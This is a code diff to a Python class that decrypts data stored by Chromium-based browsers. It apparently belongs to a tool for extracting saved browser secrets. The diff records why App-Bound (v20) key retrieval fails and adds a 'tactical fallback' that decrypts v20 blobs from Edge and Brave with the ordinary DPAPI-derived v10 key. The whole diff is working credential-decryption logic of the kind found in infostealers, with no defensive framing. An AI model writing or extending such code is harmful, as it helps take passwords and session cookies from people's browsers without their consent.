@@ -333,8 +333,13 @@ class ChromiumDecryptor:
                 if v20_key:
                     logger.debug(f"Master key AES (v20) obtenida ({len(v20_key)} bytes) para: {user_data_path}")
                     keys['v20'] = v20_key
+                else:
+                    keys['v20_error'] = "[V20 Err: get_v20_key retornó None]"
             except Exception as e:
+                keys['v20_error'] = f"[V20 Err: {e}]"
                 logger.debug(f"Fallback desde v20. Error: {e}")
+        else:
+            keys['v20_error'] = "[V20 Err: Sin app_bound_encrypted_key en Local State]"
 
         # 2. Intentar obtener llave v10 (DPAPI normal)
         encrypted_key_b64 = config.get("os_crypt", {}).get("encrypted_key")
@@ -380,10 +385,21 @@ class ChromiumDecryptor:
             if prefix == "v11":
                 aes_key = keys.get("v10")
 
+            # Fallback táctico: Si Edge/Brave marcan v20 pero no tienen llave App-Bound, probar con v10
+            if not aes_key and prefix == "v20" and keys.get("v10") and AES:
+                try:
+                    nonce = blob[3:15]
+                    ciphertext = blob[15:-16]
+                    tag = blob[-16:]
+                    cipher = AES.new(keys["v10"], AES.MODE_GCM, nonce)
+                    return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
+                except Exception:
+                    pass  # Si el fallback falla, sigue la ruta normal de error
+
             if not aes_key:
                 logger.debug(f"Blob AES-GCM sin llave disponible para prefijo {prefix}")
                 if prefix == "v20":
-                    return "[Admin Required for v20]"
+                    return keys.get('v20_error', '[Admin Required for v20]')
                 return "[Sin Llave AES]"
 
             if len(blob) < 3 + 12 + 16:      # mínimo viable: prefijo + nonce + tag vacío
